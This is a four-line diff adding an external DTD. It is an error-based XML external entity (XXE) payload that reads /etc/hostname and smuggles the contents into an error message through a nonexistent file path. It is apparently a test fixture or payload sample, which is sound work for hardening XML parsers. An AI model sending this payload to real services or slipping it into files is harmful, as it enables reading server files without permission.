@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % wrap "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
+%wrap;
+%err;
